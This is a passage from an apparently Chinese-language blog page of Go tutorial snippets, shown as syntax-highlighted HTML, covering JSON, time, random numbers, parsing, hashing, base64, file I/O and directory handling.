class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;lettuce&quot;</span>: <span class="hljs-number">7</span>&#125;  <br>    mapB, _ := json.Marshal(mapD)  <br>    fmt.Println(<span class="hljs-type">string</span>(mapB))  <br>  <br>    res1D := &amp;response1&#123;  <br>       Page:   <span class="hljs-number">1</span>,  <br>       Fruits: []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;&#125;  <br>    res1B, _ := json.Marshal(res1D)  <br>    fmt.Println(<span class="hljs-type">string</span>(res1B))  <br>  <br>    res2D := &amp;response2&#123;  <br>       Page:   <span class="hljs-number">1</span>,  <br>       Fruits: []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;&#125;  <br>    res2B, _ := json.Marshal(res2D)  <br>    fmt.Println(<span class="hljs-type">string</span>(res2B))  <br>  <br>    byt := []<span class="hljs-type">byte</span>(<span class="hljs-string">`&#123;&quot;num&quot;:6.13,&quot;strs&quot;:[&quot;a&quot;,&quot;b&quot;]&#125;`</span>)  <br>  <br>    <span class="hljs-keyword">var</span> dat <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;  <br>  <br>    <span class="hljs-keyword">if</span> err := json.Unmarshal(byt, &amp;dat); err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt.Println(dat)  <br>  <br>    num := dat[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">float64</span>)  <br>    fmt.Println(num)  <br>  <br>    strs := dat[<span class="hljs-string">&quot;strs&quot;</span>].([]<span class="hljs-keyword">interface</span>&#123;&#125;)  <br>    str1 := strs[<span class="hljs-number">0</span>].(<span class="hljs-type">string</span>)  <br>    fmt.Println(str1)  <br>  <br>    str := <span class="hljs-string">`&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;peach&quot;]&#125;`</span>  <br>    res := response2&#123;&#125;  <br>    json.Unmarshal([]<span class="hljs-type">byte</span>(str), &amp;res)  <br>    fmt.Println(res)  <br>    fmt.Println(res.Fruits[<span class="hljs-number">0</span>])  <br>  <br>    enc := json.NewEncoder(os.Stdout)  <br>    d := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;lettuce&quot;</span>: <span class="hljs-number">7</span>&#125;  <br>    enc.Encode(d)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">p</span> := fmt<span class="hljs-selector-class">.Println</span>  <br>  <br>    now := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()  <br>    <span class="hljs-selector-tag">p</span>(now)  <br>  <br>    then := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Date</span>(  <br>       <span class="hljs-number">2009</span>, <span class="hljs-number">11</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">34</span>, <span class="hljs-number">58</span>, <span class="hljs-number">651387237</span>, <span class="hljs-selector-tag">time</span>.UTC)  <br>    <span class="hljs-selector-tag">p</span>(then)  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Year</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Month</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Day</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Hour</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Minute</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Second</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Nanosecond</span>())  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Location</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Weekday</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Before</span>(now))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.After</span>(now))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Equal</span>(now))  <br>  <br>    diff := now<span class="hljs-selector-class">.Sub</span>(then)  <br>    <span class="hljs-selector-tag">p</span>(diff)  <br>  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Hours</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Minutes</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Seconds</span>())  <br>    <span class="hljs-selector-tag">p</span>(diff<span class="hljs-selector-class">.Nanoseconds</span>())  <br>  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Add</span>(diff))  <br>    <span class="hljs-selector-tag">p</span>(then<span class="hljs-selector-class">.Add</span>(-diff))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Random-Numbers"><a href="#Random-Numbers" class="headerlink" title="Random Numbers"></a>Random Numbers</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;math/rand&quot;</span>)  <br>  <br>func main() &#123;  <br>  <br>    fmt.<span class="hljs-keyword">Print</span>(rand.<span class="hljs-keyword">Int</span>(), <span class="hljs-string">&quot;,&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Print</span>(rand.<span class="hljs-keyword">Int</span>())  <br>    fmt.<span class="hljs-keyword">Println</span>()  <br>  <br>    fmt.<span class="hljs-keyword">Println</span>(rand.Float64())  <br>  <br>    fmt.<span class="hljs-keyword">Print</span>((rand.Float64()*<span class="hljs-number">5</span>)+<span class="hljs-number">5</span>, <span class="hljs-string">&quot;,&quot;</span>)  <br>    fmt.<span class="hljs-keyword">Print</span>((rand.Float64() * <span class="hljs-number">5</span>) + <span class="hljs-number">5</span>)  <br>    fmt.<span class="hljs-keyword">Println</span>()  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Number-Parsing"><a href="#Number-Parsing" class="headerlink" title="Number Parsing"></a>Number Parsing</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;strconv&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    f, _ := strconv<span class="hljs-selector-class">.ParseFloat</span>(<span class="hljs-string">&quot;1.234&quot;</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(f)  <br>  <br>    <span class="hljs-selector-tag">i</span>, _ := strconv<span class="hljs-selector-class">.ParseInt</span>(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(i)  <br>  <br>    d, _ := strconv<span class="hljs-selector-class">.ParseInt</span>(<span class="hljs-string">&quot;0x1c8&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(d)  <br>  <br>    u, _ := strconv<span class="hljs-selector-class">.ParseUint</span>(<span class="hljs-string">&quot;789&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(u)  <br>  <br>    k, _ := strconv<span class="hljs-selector-class">.Atoi</span>(<span class="hljs-string">&quot;135&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Printf</span>(<span class="hljs-string">&quot;%T\n&quot;</span>, k)  <br>    fmt<span class="hljs-selector-class">.Println</span>(k)  <br>  <br>    _, e := strconv<span class="hljs-selector-class">.Atoi</span>(<span class="hljs-string">&quot;wat&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(e)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="URL-Parsing"><a href="#URL-Parsing" class="headerlink" title="URL Parsing"></a>URL Parsing</h2><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    &quot;fmt&quot;  <br>    &quot;net&quot;    &quot;net/url&quot;)  <br>  <br>func main() &#123;  <br>  <br>    <span class="hljs-attribute">s</span> := &quot;postgres://user:pass@host<span class="hljs-variable">.com</span>:5432/path?k=v#f&quot;  <br>  <br>    u, err := url<span class="hljs-variable">.Parse</span>(s)  <br>    if err != nil &#123;  <br>       panic(err)  <br>    &#125;  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Scheme</span>)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.User</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.User</span><span class="hljs-variable">.Username</span>())  <br>    p, _ := u<span class="hljs-variable">.User</span><span class="hljs-variable">.Password</span>()  <br>    fmt<span class="hljs-variable">.Println</span>(p)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Host</span>)  <br>    host, port, _ := net<span class="hljs-variable">.SplitHostPort</span>(u<span class="hljs-variable">.Host</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(host)  <br>    fmt<span class="hljs-variable">.Println</span>(port)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Path</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.Fragment</span>)  <br>  <br>    fmt<span class="hljs-variable">.Println</span>(u<span class="hljs-variable">.RawQuery</span>)  <br>    m, _ := url<span class="hljs-variable">.ParseQuery</span>(u<span class="hljs-variable">.RawQuery</span>)  <br>    fmt<span class="hljs-variable">.Println</span>(m)  <br>    fmt<span class="hljs-variable">.Println</span>(m[&quot;k&quot;][0])  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SHA256-Hashes"><a href="#SHA256-Hashes" class="headerlink" title="SHA256 Hashes"></a>SHA256 Hashes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;crypto/sha256&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    s := <span class="hljs-string">&quot;sha256 this string&quot;</span>  <br>    h := sha256.New()  <br>    h.Write([]<span class="hljs-type">byte</span>(s))  <br>    bs := h.Sum(<span class="hljs-literal">nil</span>)  <br>    fmt.Printf(<span class="hljs-string">&quot;%x&quot;</span>, bs)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Base64-Encoding"><a href="#Base64-Encoding" class="headerlink" title="Base64 Encoding"></a>Base64 Encoding</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    b64 <span class="hljs-string">&quot;encoding/base64&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    data := <span class="hljs-string">&quot;abc123!?$*&amp;()&#x27;-=@~&quot;</span>  <br>  <br>    sEnc := b64<span class="hljs-selector-class">.StdEncoding</span><span class="hljs-selector-class">.EncodeToString</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(data))  <br>    fmt<span class="hljs-selector-class">.Println</span>(sEnc)  <br>  <br>    sDec, _ := b64<span class="hljs-selector-class">.StdEncoding</span><span class="hljs-selector-class">.DecodeString</span>(sEnc)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(sDec))  <br>    fmt<span class="hljs-selector-class">.Println</span>()  <br>  <br>    uEnc := b64<span class="hljs-selector-class">.URLEncoding</span><span class="hljs-selector-class">.EncodeToString</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(data))  <br>    fmt<span class="hljs-selector-class">.Println</span>(uEnc)  <br>    uDec, _ := b64<span class="hljs-selector-class">.URLEncoding</span><span class="hljs-selector-class">.DecodeString</span>(uEnc)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(uDec))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Reading-Files"><a href="#Reading-Files" class="headerlink" title="Reading Files"></a>Reading Files</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">check</span><span class="hljs-params">(e <span class="hljs-type">error</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">if</span> e != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    data, err := os.ReadFile(<span class="hljs-string">&quot;testfile&quot;</span>)  <br>    check(err)  <br>    fmt.Print(<span class="hljs-type">string</span>(data))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    d1 := <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;hello\ngo\n&quot;</span>)  <br>    err := os<span class="hljs-selector-class">.WriteFile</span>(<span class="hljs-string">&quot;writefile&quot;</span>, d1, <span class="hljs-number">0644</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    f, err := os<span class="hljs-selector-class">.Create</span>(<span class="hljs-string">&quot;writefile2&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    defer f<span class="hljs-selector-class">.Close</span>()  <br>  <br>    d2 := <span class="hljs-selector-attr">[]</span>byte&#123;<span class="hljs-number">115</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">10</span>&#125;  <br>    n2, err := f<span class="hljs-selector-class">.Write</span>(d2)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;write bytes: &quot;</span>, n2)  <br>  <br>    n3, err := f<span class="hljs-selector-class">.WriteString</span>(<span class="hljs-string">&quot;writes\n&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;write bytes: &quot;</span>, n3)  <br>    f<span class="hljs-selector-class">.Sync</span>()  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Line-Filters"><a href="#Line-Filters" class="headerlink" title="Line Filters"></a>Line Filters</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bufio&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    scanner := bufio.NewScanner(os.Stdin)  <br>    <span class="hljs-keyword">for</span> scanner.Scan() &#123;  <br>       ucl := strings.ToUpper(scanner.Text())  <br>       fmt.Println(ucl)  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> err := scanner.Err(); err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(os.Stderr, <span class="hljs-string">&quot;error: &quot;</span>, err)  <br>       os.Exit(<span class="hljs-number">1</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="File-Paths"><a href="#File-Paths" class="headerlink" title="File Paths"></a>File Paths</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;path/filepath&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    <span class="hljs-selector-tag">p</span> := filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1&quot;</span>, <span class="hljs-string">&quot;dir2&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;p:&quot;</span>, p)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1//&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Join</span>(<span class="hljs-string">&quot;dir1/../dir1&quot;</span>, <span class="hljs-string">&quot;filename&quot;</span>))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Dir(p):&quot;</span>, filepath<span class="hljs-selector-class">.Dir</span>(p))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Base(p):&quot;</span>, filepath<span class="hljs-selector-class">.Base</span>(p))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.IsAbs</span>(<span class="hljs-string">&quot;dir/file&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.IsAbs</span>(<span class="hljs-string">&quot;C:/a/dir/file&quot;</span>))  <br>  <br>    filename := <span class="hljs-string">&quot;config.json&quot;</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(filepath<span class="hljs-selector-class">.Ext</span>(filename))  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(strings<span class="hljs-selector-class">.TrimSuffix</span>(filename, filepath<span class="hljs-selector-class">.Ext</span>(filename)))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>filepath.Join 会自动删除多余的分隔符等等来进行归一化。</p><h2 id="Directories"><a href="#Directories" class="headerlink" title="Directories"></a>Directories</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;io/fs&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;path/filepath&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    err := os<span class="hljs-selector-class">.Mkdir</span>(<span class="hljs-string">&quot;subdir&quot;</span>, <span class="hljs-number">0755</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    defer os<span class="hljs-selector-class">.RemoveAll</span>(<span class="hljs-string">&quot;subdir&quot;</span>)  <br>  <br>    createEmptyFile := <span class="hljs-built_in">func</span>(name string) &#123;  <br>       d := <span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;&quot;</span>)  <br>       <span class="hljs-built_in">check</span>(os<span class="hljs-selector-class">.WriteFile</span>(name, d, <span class="hljs-number">0644</span>))  <br>    &#125;  <br>  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/file1&quot;</span>)  <br>  <br>    err = os<span class="hljs-selector-class">.MkdirAll</span>(<span class="hljs-string">&quot;subdir/parent/child&quot;</span>, <span class="hljs-number">0755</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/file2&quot;</span>)  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/file3&quot;</span>)  <br>    <span class="hljs-built_in">createEmptyFile</span>(<span class="hljs-string">&quot;subdir/parent/child/file4&quot;</span>)  <br>  <br>    c, err := os<span class="hljs-selector-class">.ReadDir</span>(<span class="hljs-string">&quot;subdir/parent&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Listing subdir/parent&quot;</span>)  <br>    <span class="hljs-keyword">for</span> _, entry := range c 